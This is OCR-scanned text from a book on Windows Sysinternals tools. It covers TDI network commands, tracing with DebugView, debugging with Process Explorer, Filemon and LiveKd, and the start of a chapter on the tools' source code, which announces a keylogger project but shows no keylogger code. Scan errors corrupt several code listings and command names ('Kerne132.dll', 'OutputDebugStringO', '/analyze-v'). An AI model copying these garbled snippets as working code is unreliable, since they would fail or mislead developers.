established remote endpoint, or to reject an 
offered connection. 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) to listen for offers to 
make endpoint-to-endpoint connections 
from foreign IP addresses (sets up a server). 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) for information specified 
by the client (e.g., the transports capabilities, 
a broadcast address, the current statistics for 
I/O on a particular connection, and so on). 
Continued 

358 
Chapter 8 9 Network Troubleshooting 
Table 8.2 continued TDI Commands 
Command 
TDI RECEIVE 
TDI RECEIVE DATAGRAM 
TDI SEND 
TDI SEND DATAGRAM 
Definition 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) for the data it has in its 
receive buffer. The client can set flags to 
request normal received data, expedited 
received data, and/or a peek at the data 
already received. The client has the option to 
set or clear flags for any or all of the afore- 
mentioned sets of data. With the usual set- 
tings, the transport representing the network 
device receives normal data until it receives 
an end of the record (EOR) indicator from 
the source, until it fills the receive buffer, or 
until expedited data is received. When expe- 
dited data arrives, the normal receive opera- 
tion is interrupted. The IRP for the normal 
receive is completed immediately. Then the 
transport for the network device receives 
expedited data until all such data has been 
sent to the client. Normal receipt resumes 
when the client submits the next receive 
request. 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) for an entire received 
datagram to be moved to a specified 
address. 
A request made by a kermel-mode client to 
ask the network device driver (through the 
TDI transport driver) to send a normal or 
expedited TSDU to the remote-endpoint of 
an established connection. 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) to transmit a Transport 
Service Data Unit (normal or expedited), as 
an entire datagram, to its remote endpoint. 
Continued 

Network Troubleshooting ~ Chapter 8 
359 
Table 8.2 continued TDI Commands 
Command 
Definition 
TDI SET EVENT HANDLER 
TDI SET INFORMATION 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) to call the specified 
event-handling routine whenever the related 
network event occurs. These requests are 
made following an IRP Create request, since 
Create initializes all event handlers to NULL 
for the client. 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) to set client-specific 
information on a designated address, con- 
nection, or control channel. The types of 
information that can be set include address 
information, connection information, 
provider information, and provider statistics. 

360 
Chapter 8 , Network Troubleshooting 
Summary 
This chapter should help users begin to get more utility from the System Internals 
network tools. Users will understand the meanings and sequencing of each state 
reported by the endpoint connection tools. Users will be able to interpret the ItkP 
requests and TDI commands displayed by TDIMon. This will enable the user to 
monitor and troubleshoot network applications in development. They will also be 
able to use TDIMon's realtime display to monitor and make notes on network traffic 
while using Ethereal to capture data for later analysis, know which tools apply best 
in different circumstances and where to go to get more detailed information. 
The chapter helps the user determine which tools are best for collecting infor- 
mation in different circumstances. It includes information about two supporting 
tools (Hostname and Whois) that provide a means to gather meta information about 
the owners of endpoints and domains. 
Solutions Fast Track 
Monitoring Active Network 
Connections (TCPView, Tcpvcon, TCPView Pro) 
El TCPView and TCPView Pro are the most effective tools for real-time 
monitoring of active connection endpoints. 
l:'-'d Tcpvcon is an effective tool for capturing a snapshot of active network 
connections. 
El The TCP Connections State diagram is the key to understanding the State 
column of TCPView and TCPView Pro. 
V-'d Netstat is effective in capturing a log of endpoint connection state changes 
as well as making malicious code that intercepts network traffic visible 
(with the-bu options). 
Performing DNS and 
Reverse D NS Lookups (Hostname) 
El Hostname provides a simple way to learn the IP address related to a 
hostname, or the hostname for an IP address. 

Network Troubleshooting 9 Chapter 8 
361 
Getting Public Domain Information (Whois) 
V4I Given a domain name, Whois can reveal the company owning the domain, 
the registrar, the name servers, and the administrative and technical 
contacts. 
[-d Given an IP address, Whois can reveal the company owning the IP range 
containing the address. 
[-d When conducting investigations Whois can provide names and potential 
links to systems that might contain real evidence, and sometimes, to the real 
owners and perpetrators. Remember, "Follow the money." 
Identifying Problematic Network 
Applications (TDIMon, TCPView Pro) 
gl 
gl 
gl 
Each tool reviewed provides insights into a different problem space (see 
Figure 8.7). 
TDIMon and the dynamic display of TCPView Pro show the network- 
related communication between the application and the network device 
driver.You can use this information to troubleshoot network applications in 
development. 
You can find more information about network device driver state, TDI 
commands, and IRP requests in the Windows DDK that is included in the 
ISO disk image of the KMDF found on the Microsoft Web site. 
www.syngress.com 



364 
Chapter 9 9 Tools for Programmers 
Introduction 
Programmers need to be familiar with the operating systems on which their applica- 
tions will run, just as administrators need to. While developing software, a pro- 
grammer is often left scratching his head, trying to figure out why something is not 
working or why a process behaves in a certain way. Software integrated development 
environments (IDEs) and Software Development Kits (SDKs) provide a slew of 
debugging tools to assist programmers in this effort. Unfortunately, many times these 
tools are not enough and developers need to turn to the same tools system adminis- 
trators use. 
In this chapter, we will examine a few of the tools provided by the Winternals 
group that any software developer would find useful. From implementing trace func- 
tionality, to application optimization, to low-level debugging and advanced technical 
support, we will see how the available tools can make a programmer's life easier. 
Implementing a 
Trace Feature (DebugView) 
Application tracing is a way to monitor an application while it is running and get 
valuable data that can assist in debugging. While in development, you can use the 
built-in debugging capabilities of modern IDEs, but when the application is 
deployed, either to a customer or to a test box, all internal debugging information is 
lost and you have compiled in "release" mode. If something goes wrong, it becomes 
a guessing game to determine what may have caused the crash or incorrect func- 
tionality. Unfortunately, since you cannot install development tools on a test com- 
puter, and even more so on a customer's computer, you have to implement some 
kind of nonintrusive feature that can provide you with the right kind of debugging 
information. 
Every programmer has implemented such a feature in her applications while 
developing at one time or another. Typically, the method chosen was either to write 
to a file or to display a pop-up window that shows the value of the variable or cur- 
rent location in the code. Many programmers have come to call this methodology 
caveman debugging. This leads us to question whether there is a better way. 
Fortunately, there is, and the folks at Winternals have developed DebugView (avail- 
able via the Sysinternals Web site) to help developers achieve this. 
The DebugView utility works by capturing the output from the internal 
Windows function calls listed in Table 9.1. 

Tools for Programmers 9 Chapter 9 
365 
Table 9.1 Internal Windows Function Calls 
Operating System 
Windows 95, 98, and Me 
Windows NT, 2000, XP, 
and Server 2003 
Function Call Trapped 
Win32 OutputDebugString 
Win 16 OutputDebugString 
Kernel-mode Out_Debug_String 
Kernel-mode _Debug_Printf_Service 
VVin32 OutputDebugString 
Kernel-mode DbgPrint 
All kernel mode variants of DbgPrint 
implemented in Windows XP and 
Server 2 003 
Using a Trace Feature 
During Application Development/Debugging 
Using modern IDEs, developers have the option of"stepping through" their code and 
setting break points in key locations when debugging applications, while in develop- 
ment. Although these are excellent methods of discovering problems, you cannot 
always use them. A simple example of such a case would be to debug a multithreaded 
apphcation, or an apphcation that performs some kind of complex function for which 
pausing or slowly stepping through would not give accurate data. Another example is 
when running on the development box in release mode, where the compiler/linker 
has removed the internal debug symbols. All debugging information is gone and 
attaching to the process with the IDE to debug is not very helpful. 
Using a Trace Feature While in Deployment 
During development, a developer can choose from a host of options, but when an 
application is deployed, even under test conditions, those options are severely lim- 
ited. The application is compiled in "release" mode. Figure 9.1 shows sample output 
from DebugView. 

366 
Chapter 9 9 Tools for Programmers 
Figure 9.1 Sample Output from DebugView 
Sample Trace Feature Implementations 
As you can see back in Table 9.1, the Windows application program interface (API) 
exposes a number of functions that developers can use. Although you can call these 
functions directly, language platforms, such as .NET, provide native classes that 
abstract those functions and make calling them a lot easier because you don't have to 
worry about the underlying operating system. 
The base Win32 API function that can output trace information is 
OutputDebugStringO, and its definition is as follows: 
void OutputDebugString( 
LPCTSTR ipOutputString) ; 
You declare the function in the Winbase.h file, and you can use it by including 
the Windows.h header file and linking it with Kerne132.1ib. If you are using another 
language, such as Visual Basic 6.0, you can call the function from the Kerne132.dll 
dynamic link library (DLL). On the other hand, if you're developing in a higher lan- 
guage such as .NET, you can use the System.Diagnostics. Trace class instead. Code 
Listing 9.1 contains sample code as well as tips on how to make the printed lines 
stand out. 

Tools for Programmers 9 Chapter 9 
367 
Code Listing 9.1 Calling a Trace Function in Visual Basic 
Option Explicit 
Option Base 0 
Public Declare Sub OutputDebugString Lib "Kerne132.dll" _ 
Alias "OutputDebugStringA" 
(ByVal IpOutputString As String) 
Public Function DoSomething(ByVal LoopEnd As Integer) As Integer 
Dim cnt As Integer 
For cnt = 0 To LoopEnd 
OutputDebugString 
("Current step: " & cnt) 
Next 
DoSomething = cnt 
End Function 
The sample code in Code Listing 9.1 is a simple function in Visual Basic; all it 
does is print the results of each loop iteration to any system debugger that is lis- 
tening. The output in DebugView will look exactly like Figure 9.1. Code Listing 9.2 
contains sample code in Visual Basic .NET that you can easily translate to any other 
.NET language. 
Code Listing 9.2 Calling a Trace Function in Visual Basic .NET 
Module Modulel 
Public Function DoSomething(ByVal LoopEnd As Integer) As Integer 
Dim cnt As Integer = 0 
For cnt = 0 To LoopEnd 
System. Diagnostics.Trace.WriteLine("Current 
step: " & cnt) 
Next 
Return cnt 
End Function 
End Module 
As you can see, in .NET you can use the Trace class in the System.Diagnostics 
namespace. This class exposes a number of handy functions that can make a pro- 
grammer's life a lot easier. Delving into the ins and outs of this class as well as the 
entire debugging API provided by Windows is beyond the scope of this book. 

368 
Chapter 9 9 Tools for Programmers 
One thing you may have wondered is how you will identify your own state- 
ments from all the noise if many applications are writing trace information. Once 
again, DebugView comes to the rescue with its filtering capabilities. But in order for 
it to work, you must insert a unique identifier that can be used as the search filter. 
You can also highlight certain lines using the filter mechanism to make them stand 
out, even with filters excluding "noise" (see Figure 9.2). 
Figure 9.2 DebugView Filter Dialog 
Referring to the previous samples, the text "Current step:" can become 
"[Winternals]Current step:" and you can use the [Winternals] filter in the Include field 
of the Filter dialog. 
Identifying I/0 Bottlenecks (Filemon, 
Regmon, Tokenmon, Process Explorer) 
Like application tracing, there are other methods to assist in debugging an applica- 
tion. Many times, you need to determine what resources an application is accessing 
or trying to access in order to determine whether the settings are correct or whether 
the application is functioning properly. Tools such as Filemon, Regmon, Tokenmon, 
and especially Process Explorer can give you the requisite insight and can be truly 
helpful, particularly when the application is not providing trace information. 
Debugging is not the only function that these tools can perform for a programmer. 
Just because a program is functioning without errors does not mean it is functioning 
in the best way possible. In other words, the Sysinternals tools can help in optimizing 
the code. 
Other chapters in the book have gone into depth on these tools, and therefore, it 
is not necessary to repeat that information here. 

Tools for Programmers 9 Chapter 9 
369 
CPU Utilization 
Perhaps the most common complaint users have of a functioning application is how 
much they tax the system on resources and on CPU utilization in particular. This is 
where Process Explorer can help you determine what percentage of the CPU your 
application is using, along with the history graph, the priority, and all the way down 
to the individual threads (see Figures 9.3 and 9.4). 
Figure 9.3 Performance Detail of an Application 

370 
Chapter 9 9 Tools for Programmers 
Figure 9.4 Thread Detail of an Application 
Using this performance information, in conjunction with debug printouts 
(either trace or "caveman"), you can start tweaking your code until you achieve the 
desired performance.You can also see what effect, positive or negative, the threading 
or the addition of new threads has on the overall performance. 
Viewing Loaded Objects 
It is common for applications to load a library in order to call a function, but not 
unload it when it is no longer needed. This is typical of Visual Basic applications 
when accessing the Win32 API, as the Visual Basic runtime will load the DLL 
(calling LoadLib) when it is time to execute the declared external function, but will 
never unload it until the application exits. This can result in using excessive local 
resources when it is not necessary, resulting in users considering the application a 
"resource hog."You can easily use Process Explorer to view all the objects that your 
application has currently loaded and quickly see what is not necessary. 

Tools for Programmers 9 Chapter 9 
371 
Objects loaded need not be libraries only (see Figures 9.5 and 9.6). Files, direc- 
tories, mutexes, and so on, also tax the system and impact the overall performance of 
the application, as these objects require a handle to access. File handles, just like any 
pointer, need to be managed correctly in an application lest they cause handle leaks. 
Figure 9.5 Loaded Objects 
www.syngress.com 

372 
Chapter 9 9 Tools for Programmers 
Figure 9.6 Loaded Modules 
Sometimes that file or Registry key has not been loaded, the wrong version of a 
DLL is being used, or even the wrong named pipe is being accessed.You can access 
such information easily via Process Explorer and by loading the appropriate lower 
pane for the application in question. 
Benchmarking File, 
Registry, and Token Accesses 
So far, you have seen how to determine how much processing power you are using 
and the resources loaded to help you optimize your application. That is only part of 
the optimization problem. Every application accesses files, or Registry keys, or secu- 
rity tokens, or all of the above. Hopefully, a programmer will know which of the 
objects his application is accessing, but knowing the application's I/O performance is 
another matter. A typical question a user may ask is, "Do you have any metrics on 
how it performs X or Y?"There is no honest way to answer that question, unless 
you take some specific benchmarks. This is where tools such as Filemon and 
Regmon shine. 
www.syngress.com 

Tools for Programmers 9 Chapter 9 
373 
Filemon, as the name implies, is a file-monitoring tool that can show you which 
files are being accessed by which processes, as well as the type of access. The most 
important piece of information Filemon provides is the timestamp. Using these 
values, you can determine what the performance is under various conditions. A typ- 
ical scenario is to load Filemon with the appropriate filters and let the application 
run under the test conditions. When done, you can save the log to a file and process 
it externally with tools such as Log Parser, or even load it into a database. 
Just like Filemon, 1Kegmon provides similar information, but for Registry keys 
rather than files. Here too, you can set filters, adjust the timestamp, and save the log 
to a file for further processing. A very helpful feature in 1Kegmon is the ability to 
jump to a selected key in the Registry by clicking on the appropriate toolbar 
button. It is an easy way to view the data in any accessed key, without having to 
navigate lengthy trees with tools such as 1Kegedit. 
Security token accesses are just as important and can severely affect an application's 
performance if not managed properly. Unnecessary token loading and unloading con- 
sume CPU cycles and may unnecessarily write to the system event logs. Tokenmon 
can provide you with an internal view of what your application is doing. Once again, 
the consistency across the user interfaces of the Sysinternals tools allows you to add fil- 
ters and highlights, configure timestamps, and save the log to a file. 
In a QA scenario, creating test cases that implement all of these tools can provide 
the required data for QA personnel to create the metrics and benchmarks to assist 
development and be able to compare performance between builds. 
Isolating Areas for Optimization 
The output of the analysis that comes out of the previous sections will make it evi- 
dent to a programmer or QA person where the bottlenecks are and what the poten- 
tial problems may be. Once these areas have been identified, specific test cases and 
development approaches can be created to address them. The Sysinternals tools may 
be important to a programmer, but they are indispensable to a QA engineer. 
Additionally, using Handles or Process Explorer, you can see which object han- 
dles are open and in use, and you can spot places in your program where you are not 

374 
Chapter 9 9 Tools for Programmers 
fleeing handles correctly. This issue is known as handle leak, and it occurs much in 
the same way as memory leaks. 
Analyzing Applications 
(Process Explorer, Strings) 
As programmers, many times we must investigate and analyze a running application 
to figure out what it is doing. Regardless of whether we have access to the applica- 
tion's source code, we should be able to investigate a running process and gather as 
much information as possible about it. This ability becomes of great value when 
trying to debug a deployed application on a production system. 
Examining a Running Application 
When wearing our technical support, debug, or QA hat, we analyze and try to 
understand processes that are loaded and running. The case that requires analysis of 
an application when it is not running is the typical application debugging process, 
including code review. We will not be covering the reverse engineering of nonrun- 
ning applications using such techniques as decompiling or dissembling, for two rea- 
sons. First, it is illegal under the Digital Millennium Copyright Act (DMCA), and 
second, it is beyond the scope of this book. 
Perhaps the easiest tool in the Sysinternals toolbox to view the internals of a 
running process is Process Explorer. In earlier sections of this book, and earlier in 
this chapter, you learned how to use the utility in various scenarios. Now you will 
learn how to interpret some of that information as a software developer. 
Running Threads 
Just viewing a list of threads that the application has spawned is interesting, and you 
can accomplish this through the built-in Windows Task Manager. Process Explorer 
can take you beyond that and allow you to peek under the hood of an application as 

Tools for Programmers 9 Chapter 9 
375 
Windows sees it. Perhaps the most valuable information is the stack information 
given per thread.You can access this information by selecting the thread you want to 
review and clicking the Stack button (see Figure 9.7). 
Figure 9.7 Process Thread Stack View 

376 
Chapter 9 9 Tools for Programmers 
Open Sockets 
Just like threads, the active sockets of an application are important to know about. To 
gather the most comprehensive information available on network activity, you need 
to use TDIMon and Process Explorer together.TDIMon can provide the real-time 
network activity of your application, along with a wealth of data regarding request 
types, protocols, bytes transmitted/received, and so on. Process Explorer can give the 
stack information for any socket connection opened by the application and allow 
you to locate where the activity truly originates from, and how. 
Open Handles 
In addition to all the threads created and sockets used by the application, the actual 
system resource objects loaded and accessed are important to know, if you truly want 
to form a complete analysis of the process. By reviewing the handles that the appli- 
cation has open, you can determine how it operates, and you can learn its impact on 
the system. For example, you may discover that all the files accessed are located in a 
specific directory, or that it uses an INI or XML file to store and retrieve configura- 
tion information. 
The Handles utility, as well as Process Explorer, can give you all this information. 
Especially when you couple them with Filemon and 1Kegmon you can create a 
complete picture of any application and how it interacts with Windows and the file 
system throughout its lifetime. Running these tools in unison can allow you to see 
what the application does on startup (read from the Registry and load the configu- 
ration files); what it does while running (open a named pipe and read/write data); 
and what happens when the user closes the application (save settings to the file and 
update the Registry).You may even discover that the application overwrites configu- 
ration files when it closes instead of updating them. 
Finding Embedded Text 
Almost all programs, whether they are Windows or console applications, have text 
strings embedded in them. Either the developer or the compiler can insert this text, 
and it may never be displayed to the user. However, it is still there. On the other 
hand, sometimes you have defined a string constant in your code and you expect it 
to be printed, and you are surprised when you see "garbage" text on your screen. 
The Sysinternals toolset provides you with two methods of listing these 
embedded strings. The graphical mode is to use Process Explorer, which you should 
be proficient with by now; the more versatile method is to use the Strings utility. 
Process Explorer, through its properties dialog for processes, can display all the strings 

Tools for Programmers 9 Chapter 9 
377 
located in the binary object on disk, or only those loaded into memory (see Figure 
9.8). It also can search through the list for a specific string. 
Figure 9.8 List of Strings Found in the File firefox.exe 
The Strings command-line utility is more versatile, as it is specifically designed 
to search for strings, be they Unicode or ASCII strings inside of files. It has the addi- 
tional capability of searching recursively through directories, and with the addition 
of a search filter, it can become an exceedingly powerful tool. It is more capable at 
listing strings than grep is, since it has built-in intelligence to distinguish what it per- 
ceives as strings versus random text.As you can see in Figure 9.9, the possible com- 
binations of arguments are extensive, especially if combined, and the results are piped 
through to a grep-like utility, such as the Windows tool, findstr. Figure 9.10 demon- 
strates just such an example, by combining Strings and findstr to find all ASCII 
strings at least 30 characters long, containing the word javascript in the file 
firefox, exe. 

378 
Chapter 9 9 Tools for Programmers 
Figure 9.9 Command-Line Arguments for Strings 
Figure 9.10 Combining Strings and findstr 
I Wonder How It's Doing That 
How many times have you looked at an application and wondered how (or why) it 
is doing something. Typically, we use our favorite Internet search engine to try to 
come up with the right keywords to get the answer we want, if we find it. A better 
way of discovering the answer is to use the tools created by Sysinternals and the 
information you gathered to search the MSDN documentation. 
By using the knowledge gathered by reading this book, you can see which 
libraries are being loaded by the target application (ListDLLs) and when (Filemon). 
This information can help you filter your search in the documentation, since you 
know which library probably contains the function you are looking for. Process 
Explorer can give you the stack trace of the various threads and help you determine 
how the relevant libraries and functions are called. Handles and Tokenmon can give 
you the insight needed to finally discover why your own application is failing when 
attempting to accomplish the same task (for example, rebooting a computer). 

Tools for Programmers 9 Chapter 9 
379 
Debugging Windows (LiveKd) 
Sysinternals provides a tool that allows you to run the Microsoft kernel debugging 
tools WinDbg and Kd on the local live system. LiveKd is a much more feature-rich 
kernel debugger than the built-in debuggers for WinDbg and Kd. Additionally, 
LiveKd works on all versions of Windows, from NT 4.0 through Windows Server 
2003, including the 64-bit versions of Windows, with the same feature set. To use 
LiveKd you must download the debugging tools for Windows, which are available 
on the Microsoft Web site. 
We do not have the space in this chapter to cover kernel debugging, so I will 
just provide an overview of how the tools work, and I will give pointers on where 
to go from there. 
LiveKd offers the option of using the KD kernel debugger (default) or WinDbg, 
by using the appropriate command-line switch (see Figure 9.11). Additionally, an 
image file can be loaded for debugging: 
usage: livekd [-w] [-d] [-k <debugger path>] 
[debugger options] 
-w 
Runs windbg instead of i386kd/kd 
-d 
Runs Dumpchk exam instead of i386kd/kd 
-k 
Specifices complete path and filename of debugger image to execute 

380 
Chapter 9 9 Tools for Programmers 
Figure 9.11 Starting LiveKd 
Debugging a Live Windows System 
Upon executing LiveKd, without specifying an image to execute, you are actively 
debugging your current system. Using the appropriate debugger commands, you can 
access the internals of the system and view all the information loaded in memory. To 
those that have an MS-DOS background, LiveKd is reminiscent of the old "debug" 
tool, which coincidentally is still available, even with Windows XEYou can retrieve 
simple stack information by issuing the r command, where you can see the value for 
all the registers. 

Tools for Programmers 9 Chapter 9 
381 
A Programmer's View of a System Crash 
In the rare event that an application you created causes a system crash, you will want 
to know as much as you can about what caused the crash. The best way to do that is 
to get a copy of the crash dump file generated by Windows and load it into LiveKd. 
Once you start LiveKd with the debugger of your choice, you can load the 
dump file you want to analyze. Issuing the command .opendump <dump.file> will load 
the dump file into the debugger so that you can begin the analysis and determine 
what went wrong. There are many types of system dump files, and each type can 
contain varying amounts of information. The most complete of all is the full 
memory dump, and the least complete is the mini dump, which contains only a 
subset of all the available information. 
Once the dump file has been loaded, the first command you would typically 
issue is/analyze-v. This command will perform a verbose analysis of the dump file 
and, if you are lucky, identify the problem for you. If the default analysis makes a 
positive identification of the errant module, but you are not familiar with it, you can 
issue the command lm kv m <modulename> to get the description of the module in 
question. 

382 
Chapter 9 9 Tools for Programmers 
Tracking Application Configuration 
Problems (Process Explorer, Tokenmon) 
Though the advent of .NET has "liberated" us from the dreadful "DLL hell" many 
applications, even .NET applications, still reference system libraries directly and 
expect them to be of a certain version. Many a programmer has discovered that a 
function declaration has changed from, say, version 2.5.6 to version 2.5.7, and some- 
times the function disappeared completely, resulting in an application crash. Then, of 
course, you have the situation when a program is expected to be able to access cer- 
tain resources, but the configuration of the local system or the privileges of the run- 
ning user are not sufficient. This again can cause various unpredictable problems, 
leading to exasperated QA personnel or, worse, exasperated users. 
A proficient application developer can use some of the same tools administrators 
use to detect what went wrong and assist him in preventing the problem from 
arising again. One more time, Process Explorer and Tokenmon, among others, can 
play this role. 
Listing Active Security Credentials 
The easiest and most user-friendly way to display active security privileges is 
through Process Explorer. The Process Properties dialog lists all the security informa- 
tion for a running process in its Security tab. As you can see in Figure 9.12, Firefox 
is running under the context of the local user, KIMON01\Kimon, and is inheriting 
permissions from the built-in Administrators group. Therefore, right away you can 
see whether your application is running under the proper credentials. Additionally, 
you can see whether your process has the appropriate privileges enabled. Once 
again, referring to Figure 9.12 you see that Firefox has SeDebugPrivilege disabled; 
therefore, it cannot debug a process. 

Tools for Programmers 9 Chapter 9 
383 
This information becomes important when your program is attempting to per- 
form a function and it fails, and all you get from the operating system is an "Access 
Denied" message, leaving you trying to decipher what it could possibly mean. The 
active privileges listing can very easily tell you whether you have requested and 
enabled the correct privilege for whatever task you want to perform. 
Sometimes security privileges are enabled and disabled before you have the 
chance to see it come up in the Properties Security view. In these instances, 
Tokenmon can report token creation and deletion, user impersonations, and the 
enabling and disabling of security privileges in process tokens. This way, you can see 
whether your application ever requests the appropriate permission to perform the 
task in question. Tokenmon accomplishes its monitoring by using the following 
native API functions to hook into the inner parts of Windows and detect when 
changes occur: 
9 NtCreateToken 
9 SeRegisterLogonSessionTerminatedRoutine 
9 NtAdjustPrivilegesToken 
9 PsSetCreateProcessNotifyRoutine 
9 NtSetlnformationThread 
Tokenmon also uses a number of undocumented functions from various libraries 
to gather the required information as well as forcibly calling functions in the 
NTOSKRNL.DLL library that are not exposed to drivers. 

384 
Chapter 9 9 Tools for Programmers 
Figure 9.12 Active Security Settings for firefox.exe 
Verifying That the 
Correct Files and Modules Are Loaded 
ListDLLs and Process Explorer list all of the DLLs currently loaded by your applica- 
tion. When debugging a program, it is important to know that the right libraries are 
loaded from the right location. Reviewing the information reported by these tools, 
you can determine whether the correct version of the DLL is present on the system 
and the location from which it is being loaded. Just because the host operating 
system is the right version, does not mean that the file paths and their versions are 
what you expect them to be. 

Tools for Programmers 9 Chapter 9 
385 
Typically, when referencing a function in a system library, you reference the DLL 
by name and do not provide an absolute path, not knowing where the System32 
folder may reside on the target system. However, many times the local %PATH% 
environment variable can force your application to load a DLL from the wrong 
directory, resulting in new, unintentional "features" to develop. 
The same is true regarding library versions. A typical installation package will not 
overwrite a library if the existing file has a newer version. The problem is that you 
may not have tested your application with this newer library version and have no idea 
what may go wrong. Older programmers might remember the issues with the dif- 
ferent versions of MFC42.DLL in previous releases of the Windows operating system. 
Also, you may need to confirm that the correct files, Registry keys, or named 
pipe is being used. All of these objects require a handle to be opened before using 
them, and using Process Explorer or Handles, you can view them all. Though 
Process Explorer provides a nicer GUI, Handles is more powerful, as it can take fil- 
ters from the command line and even forcibly close a handle that may be locking up 
your application. 

386 
Chapter 9 9 Tools for Programmers 
Summary 
In this chapter, you learned how a programmer can use some of the same tools 
system administrators use to assist in application optimization and debugging.You 
also learned how to debug and analyze an application when you do not have access 
to the source code, as is typically the case when the software has been deployed to 
customers. The techniques you learned here are valuable whether you are in devel- 
opment, are in QA, or have put the application into production. 
We also covered the everyday problems that pester developers, testers, and sup- 
port personnel, and the simple solutions to those issues provided by Sysinternals. We 
covered the tools extensively throughout this book; in this chapter, you saw how tra- 
ditional administrative tools could simplify a programmer's life. More specifically, we 
discussed the following: 
9 
Implementing trace functionality and tracking those trace statements with 
DebugView 
9 Detecting application bottlenecks and creating benchmarks and metrics 
using Process Explorer, Filemon, and Regmon 
9 Analyzing an application and extracting information from a running pro- 
cess using Process Explorer and Strings 
9 
Detecting configuration issues using Process Explorer, ListDLLs, and 
Handles 
Solutions Fast Track 
Implementing a Trace Feature (DebugView) 
Vr Application tracing is an easy and handy way of displaying debug 
information in production. 
Vr To print trace statements you can use OutputDebugStringO or the .NET 
class, System.Diagnostics. Trace. 
Use a unique identifier for your trace statements to identify them in 
DebugView easily. 
r-el DebugView can highlight specific statements and bring them to your 
attention. 

Tools for Programmers 9 Chapter 9 
387 
Identifying I/O Bottlenecks (Filemon, 
Regmon, Tokenmon, Process Explorer) 
V4I I/O access optimization is as important as process optimization. 
V-'-'-'d Use Filemon and Regmon to time file and Registry accesses and to create 
benchmarks. 
V4I You can export the monitoring logs to a file to generate metrics. 
Process Explorer can provide lower-level performance information per 
application thread. 
Analyzing Applications (Process Explorer, Strings) 
V4I You can view stack information on a per-thread or per-socket basis. 
gl 
You can identify .NET applications and view internal .NET information 
through the Process Properties window. 
Use Filemon, Regmon, and Tokenmon to learn how an application is 
performing a certain task. 
V4I Use a grep-like tool, such as findstr, to filter through Strings output. 
Debugging Windows (LiveKd) 
V------d Use the r command to view the current values loaded in the system 
registers. 
gl Create a dump file by issuing the command .dump/for .dump/ma 
V---d Load a dump file with the command .opendump <dumpfile> 
Use the !analyze-v command for a verbose, automated analysis of a crash 
dump file. 


Tools for Programmers 9 Chapter 9 
389 
Q" Why should I use TDIMon when I can use netstat? 
A" Netstat is a very helpful tool that you can use when you don't have TDIMon, 
but the information netstat reports is not enough for a developer to pinpoint 
more esoteric issues that may be arising. 
Q" My application uses threads, but the thread stack view in Process Explorer 
doesn't match my code. How come? 
A: Make sure you have the Microsoft Debug Tools installed with the proper 
DbgHlp.dll, along with having debug symbol information available. 
Q: I've discovered what modules are being loaded and when, but how do I tell 
which functions are being used? DLLs such as Kernel32 have a ton of functions 
exposed. 
A: You can use a tool such as Microsoft's Dependency Walker to see which of the 
exposed functions are being used. The Dependency Walker is available with all 
versions of Visual Studio. 
Q: I'm running Windows XP and my system crashed, but no dump file was created. 
Why? 
A" This probably occurred because Windows was configured to not create them. To 
configure the crash dump settings, access the Advanced tab in your System 
Properties and set the Setup & Recovery settings. 
Q-" i got a blue screen of death. Can I debug that? 
A" Yes, but you'll need a separate computer to connect to the crashed one via a 
serial cable to get the debug information. It's a good idea to save the dump to a 
file so that you can work off:line. 


392 
Chapter 10 9 Working with the Source Code 
Introduction 
We have been fortunate enough to have the Winternals team release the source code 
of many of their tools. We have also been lucky enough to have the permission to 
freely use the source code for noncommercial, personal purposes. In this chapter, we 
will discuss the available source code, and you will learn how to compile it. We will 
also attempt to create a simple keylogger based off the source code for Ctrl2cap. 
Overview of the Source 
From the Sysinternals Web site you can get to the source code of many of the utili- 
ties that are available for download in binary form, as well as code snippets that 
demonstrate concepts that the makers of these tools would like to teach us. 
Sometimes the article accompanying the code is more valuable and provides more 
insight than the code itself. Other times the code is required in order to understand 
some of the more difficult ideas. 
In general, all pages/articles that contain source code downloads give an 
overview of how things work, why the author chose to code in the way he did, and 
how the operating system reacts. Occasionally, an undocumented function may be 
used, but the fact that such a function is used is well documented, with all the rele- 
vant caveats. Finally, the code includes a clear statement regarding which Windows 
platforms it supports, along with links to older versions, such as those targeting 
Windows 95 and Windows 98 systems. 
Tools with Source Code 
A large number of the Sysinternals tools have their source code available for down- 
load. Here is a list of all the utilities that come with source code bundled: 
www.syngress.com 

Working with the Source Code 9 Chapter 10 
393 
9 
AccessEnum 
9 
AdRestore 
9 
Autologon 
9 
CacheSet 
9 
Ctrl2cap 
9 
Defrag 
9 
DiskExt 
9 
Formatx and Chckdskx 
9 
Fundelete 
9 Junction 
9 
Netstatp 
9 
NewSID 
9 
NTFSInfo 
9 
ProcFeatures 
9 
PsLoggedOn 
9 
SDelete 
9 
SecDemo 
9 
ShareEnum 
9 
Tokenmon 
9 
TVCache 
In addition to the source code itself, the Sysinternals Web site is a treasure-trove 
of information about the ins and outs of Windows, and it provides thorough expla- 
nations of how and why the operating system does what it does. A case in point is 
the great write-up on NT file system (NTFS) disk defragmenting,"Inside Disk 
Defragmenting." 

394 
Chapter 10 9 Working with the Source Code 
IDE and Languages Used 
System utilities have traditionally been written in lower-level languages, such as C 
and assembly, since direct, fast access to system resources is required to perform the 
esoteric functions these tools perform. The Sysinternals suite of tools follows the 
same tradition. C, and on occasion C++, is used throughout for everything from the 
backend code to the frontend graphical user interface (GUI). Microsoft's Visual 
Studio 6.0 IDE is used to create all the projects whose source code is available to 
download, and it is still the recommended integrated development environment 
(IDE) for creating truly native applications on Windows platforms. 
Porting Considerations 
Porting is always a concern; especially when access to Visual Studio 6.0 is not avail- 
able and all you have are the .NET versions of the Microsoft IDE, such as Visual 
Studio 2003 or 2005. When "upgrading," you must take into consideration the 
changes in the language and the new syntax requirements. Perhaps the biggest 
headaches are encountered when trying to compile the new and "improved" Visual 
Studio 8 (2005) version of the applications. In the previous version, 2003, most of 
the code will compile with minimal changes, since there were few modifications to 
the language. In 2005, it is common to run into tens or even hundreds of errors and 
warnings since, very simply, the variable scopes have changed. See, for example, the 
code in Code Listing 10.1, which works just fine in Visual Studio 6.0, and how it 
must be changed in Visual Studio 2005 (Code Listing 10.2); notice where the vari- 
able i is declared. 
Code Listing 10.1 Snippet of Code from 
enumeration.h in AccessEnum, As Is 
for ( int i = 0; i < sizeof RegKeys/sizeof 
RegKeys[0] ; ++i ) 
